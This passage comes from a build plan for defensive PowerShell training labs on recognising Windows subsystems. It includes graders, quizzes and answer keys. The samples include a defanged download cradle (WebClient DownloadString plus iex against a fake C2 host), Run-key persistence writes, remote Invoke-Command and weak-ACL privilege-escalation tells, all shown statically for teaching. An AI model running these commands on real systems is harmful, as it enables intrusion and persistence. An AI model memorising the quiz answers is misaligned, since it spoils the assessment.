$acl = Get-Acl .\file; $acl.SetAccessRule($rule); Set-Acl .\file $acl   # writes a new ACE (abuse if the object is writable)
# abuse tell: an ACE granting Users/Everyone WriteDacl/WriteOwner/FullControl/GenericAll on a privileged object = privesc
```

DECODE moment: `.Access` enumerates ACEs (identity → rights → allow/deny); a weak DACL
(a low-priv identity with `WriteDacl`/`WriteOwner`/`FullControl`/`GenericAll` on a service
binary, scheduled task, or Run key) is a **privesc path**. Windows ACL semantics.

**Environment note — `[WINDOWS-VARIANT]`.** `Get-Acl` on Linux returns POSIX-limited info
and `Set-Acl` of Windows ACEs is Windows-only. Graded path = static recognition of a
**shipped** `Get-Acl` dump. `meta.json` `"windows_variant": true`.

**check.sh grades** (static extraction from a shipped sample):
- ship `files/acl-output.txt` (a `Get-Acl .Access` dump containing a weak ACE, e.g.
  `BUILTIN\Users  Allow  FullControl` on `svc.exe`). Learner writes `finding.txt` naming
  the dangerous right + why it's privesc. `assert_file_exists finding.txt`,
  `assert_file_contains finding.txt 'FullControl|WriteDacl|WriteOwner|GenericAll'`,
  `assert_file_contains finding.txt '[Pp]riv|[Ee]scalat|[Aa]buse'`.

**Quiz (3):**
1. *(choice)* `(Get-Acl path).Access` returns what? → **the ACEs — each identity's rights
   and allow/deny**. *(distractor: "the file's contents")*
2. *(text)* Name one ACL right that, granted to a low-priv user on a privileged object, is
   a privesc path. → **`WriteDacl` / `WriteOwner` / `FullControl` / `GenericAll`** *(any)*.
3. *(choice)* On WSL2 pwsh, does `Set-Acl` apply Windows ACEs? → **No — Windows security
   descriptors are Windows-only (read statically)**. *(distractor: "yes, identically")*

**Recap (3 lines):**
```
Get-Acl reads a security descriptor (.Access = the ACEs: identity → rights → allow/deny); Set-Acl writes it
weak DACLs (Users/Everyone with WriteDacl/WriteOwner/FullControl on a privileged object) = a privesc path
ACL semantics are Windows-only; you read Get-Acl output statically on WSL2 and spot the abusable ACE
```

**recall.json:** none.

---

### L3.8 — Phase gate: identify the Windows subsystem in ten one-liners · AUDIT · **GATE** · est 25m

**Teaching artifact (AUDIT — the integrative gate).** Ten one-liners (`files/subsystems.txt`);
for each, the learner names the **subsystem** (.NET / COM / WMI-CIM / registry / iex /
remoting / ACL) and the **attack relevance**. Ten worksheet questions → `answers.md`; a
3-question gate quiz enforces 3/3 (§3c). Pure static read — fully gradable on WSL2, no
Windows-only execution.

The ten one-liners (static; network defanged):
```text
 1  [System.Convert]::FromBase64String($b)                                    # .NET (base64 decode)
 2  New-Object -ComObject WScript.Shell                                       # COM
 3  Get-CimInstance Win32_Process                                             # WMI/CIM
 4  Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' …  # registry (persistence, T1547.001)
 5  iex $payload                                                              # iex / eval
 6  Invoke-Command -ComputerName DC01 -ScriptBlock { … }                      # remoting (lateral, T1021.006)
 7  (Get-Acl $p).Access                                                       # ACL enumeration
 8  [System.Net.WebClient]::new().DownloadString('hxxp://cdn.fake-c2[.]test') # .NET network (cradle fetch half)
 9  Get-WmiObject Win32_Service                                               # WMI (and a PS5.1 version tell)
10  $sh.RegWrite('HKLM\…\Run\x', …)                                          # COM → registry persistence
```

**check.sh grades** (worksheet threshold; static; no live execution):
- `assert_file_exists answers.md`, then a **set-e-safe ≥6-of-8 threshold**
  (`n=$((n+1))`, `if grep -Eiq …`) over subsystem keywords: `Convert|\.NET`, `COM`,
  `CIM|WMI`, `registry|Run`, `iex|eval`, `Invoke-Command|remot`, `Acl|ACE`,
  `DownloadString|WebClient`. (`answers.md` is keyword-stuffable → the quiz is the gate.)

**Quiz (3) — the gate:**
1. *(choice)* `iex ([System.Net.WebClient]::new().DownloadString('hxxp://x'))` — one line;
   which two subsystems and what pattern? → **a .NET network fetch + `iex` eval = a
   download cradle (fetch-and-run)**. *(distractor: "COM + registry")*
2. *(choice)* You see `Get-WmiObject` in a one-liner — two facts? → **it's WMI access AND a
   PS5.1 tell (`Get-WmiObject` is removed in PS7)**. *(distractor: "modern PS7 CIM")*
3. *(text)* `Set-ItemProperty 'HKCU:\…\CurrentVersion\Run' …` — which subsystem, to what
   end? → **the registry — autostart persistence (T1547.001)**.

**Recap (3 lines):**
```
you can now name the Windows subsystem behind a one-liner: .NET, COM, WMI/CIM, registry, iex, remoting, ACL
the download cradle = [WebClient].DownloadString + iex; Get-WmiObject is a PS5.1 tell; Run keys = persistence
Phase 3 is recognition — you meet the pieces here so Phase 4 (attack surface) is reading, not discovery
```

**recall.json:** none on L3.8 (gate). **Build deliverable (Phase Builder step 6): draft
L4.1's `recall.json` now** — 5 Qs spanning Phase 2 + 3, all `[VERIFY-AT-BUILD]`:
1. `source: ps L3.1` — Which .NET type does base64 decoding? → **`[System.Convert]`** *(`::FromBase64String`)*.
2. `source: ps L3.5` — What does `iex` do? → **evaluates a string as code (PS's eval)**.
3. `source: ps L3.3` — Is `Get-WmiObject` available in PS7? → **No — removed; use `Get-CimInstance`**.
4. `source: ps L3.4` — `HKLM:\...\CurrentVersion\Run` — significance? → **autostart persistence (T1547.001)**.
5. `source: ps L2.2` — Does a PS `switch` fall through? → **Yes — no implicit break**.

---

## 5. Build order, self-test, phase-close (Phase Builder protocol)

1. Scaffold `tracks/ps/phases/p3` (add `phases.p3` to `tracks/ps/track.json` if it
   enumerates phases). **Phase 3 assumes Phases 0–2 are built first.**
2. Build **lab by lab in id order** (L3.1 → L3.8). Commit each after self-test:
   `ps <id>: <title>`.
3. **Self-test (no-fiction rule, Windows-variant caveat):** run every `lab.md` command in
   real pwsh 7 and paste REAL output. For **cross-platform** graders (L3.1 probes, L3.3
   `Get-WmiObject`-absent, L3.6 param probe) paste the real WSL2 output. For
   **windows-variant** labs, the WSL2 self-test confirms the **error/absence** and the
   **static grade path**; any Windows-only sample output is labeled "reproduced on a
   Windows overlay — not required for grading," **never faked**. Resolve every
   `[VERIFY-AT-BUILD]` (§7). Run `check.sh` twice (fail + pass).
4. **shellcheck-zero + lint:** every `check.sh` passes `tools/shellcheck-all.sh` **and**
   `tools/lint-labs.sh` (no absolute paths, no banned tokens, **no `$` in `pwsh
   -Command`**). Windows-variant labs' `check.sh` are **pwsh-free static graders** (L3.2,
   L3.4, L3.5, L3.7, L3.8); L3.1/L3.3/L3.6 ship cross-platform probe `.ps1`s. Ship every
   sample: `com-oneliners.txt`, `reg-oneliners.txt`, `acl-output.txt`, `subsystems.txt`,
   `shadow-iex.ps1`, and the probe `.ps1`s.
5. **Safety self-check (build gate):** grep the whole phase — **no** `check.sh` calls
   `iex`/`Invoke-Expression`/`DownloadString`/`New-Object -ComObject`/`Get-CimInstance`
   /`Get-WmiObject` against live data or any registry/ACL write; **all** IOCs defanged and
   fictional; the cradle appears only as static text; the shadow is wired to a benign
   literal only.
6. **Gate:** L3.8 `gate:true`; verify `quiz_run` requires 3/3.
7. **Recall:** L3.1's `recall.json` ships now (still `[VERIFY-AT-BUILD]` vs built Phase
   1/2); L4.1's is drafted now (§4, L3.8).
8. **Close out:** `lab status`/`resume` correct; update `planned_execution.md` (`ps p3` →
   done + evidence); tag `ps-p3`; report against the checklist.

**Phase Acceptance Checklist (report each):** lab count/titles/types match the map (8, 6
DECODE + 2 AUDIT, gate at L3.8); windows-variant labs (L3.2/3.3/3.4/3.6/3.7) flagged in
`meta.json` and graded statically with **no Windows grading dependency**; the safety
self-check (step 5) passes; every lab self-tested (real WSL2 output; windows-only output
labeled, never faked); shellcheck + lint clean; gate 3/3; L3.1 recall ships + L4.1 recall
drafted; `planned_execution.md` updated; phase tagged `ps-p3`.

---

## 6. Verification summary (authoring pass — corrections pre-folded from ps-p01/ps-p2)

No pwsh executed this session (not installed). Carried-forward decisions:
- **Windows-variant grading (§3a):** the phase's defining constraint — five labs are
  Windows-only at runtime and graded by **static recognition**; the graders that *do* run
  pwsh use only **cross-platform** facts (L3.1 base64/UTF-16LE math; L3.3 `Get-WmiObject`
  absent in PS7; L3.6 cmdlet-param existence). No grade needs a Windows session.
- **Safety (§3b, §5 step 5):** the download cradle is **static, defanged, fictional**;
  `check.sh` calls no `iex`/`DownloadString`/COM/WMI/registry/ACL-write; the PowerShell
  command-shadow is benign-literal-only. Cross-track `iex`↔bash-`eval` hook noted.
- **Hygiene (§2b):** `.NET`/back-slashed literals via `assert_file_contains_fixed`
  (`System.Net.WebClient`, `CurrentVersion\Run`); real `assert_output_contains` 4-arg
  signature; case/word-tolerant ERE for free text.
- **Recall sourcing rule honored:** L3.1 recall drafted from the curriculum's Phase 1/2
  lab list (Phase 2 not built) and marked `[VERIFY-AT-BUILD]`.

**The build session must still run the per-lab adversarial correctness pass ps-p01 used**
(one PowerShell-7 + bash/harness reviewer per lab) and resolve §7 before shipping.

---

## 7. Open `[VERIFY-AT-BUILD]` items (confirm against real pwsh 7.4 at build)

| lab | item |
|---|---|
| L3.1 | `b64.ps1` → `aGk=`; `decode.ps1` (UTF-16LE) → `hi` (base64 `aABpAA==`); `[System.Net.WebClient]` stays name-only |
| L3.2 | exact "not supported on this platform" error for `New-Object -ComObject` on Linux (static grade doesn't depend on it) |
| L3.3 | `Get-WmiObject` is absent in PS7 → `ABSENT-IN-PS7` (universal); whether the `Get-CimInstance` *command* exists in Linux pwsh 7's module set (grade only the absent-`Get-WmiObject` fact) |
| L3.4 | exact "cannot find drive `HKLM`" error on Linux; `assert_file_contains_fixed 'CurrentVersion\Run'` matches the learner file |
| L3.5 | a `function Invoke-Expression` shadows the cmdlet in pwsh 7 (function > cmdlet precedence); `check.sh` stays pwsh-free; cradle never executed in any form |
| L3.6 | `Invoke-Command` exists with a `ComputerName` parameter on Linux pwsh 7 → `HAS-COMPUTERNAME`; WinRM transport itself not exercised |
| L3.7 | `Get-Acl` output shape on Linux (POSIX-limited) — grade the **shipped** `acl-output.txt`, not a live `Get-Acl` |
| L3.8 | static classification only; the ≥6-of-8 keyword threshold catches genuine reads without live execution |

---

*Plan v1 (authored from curriculum §6 + the settled ps-p01/ps-p2 template) — awaiting
review. PLAN ONLY; nothing built, nothing committed.*
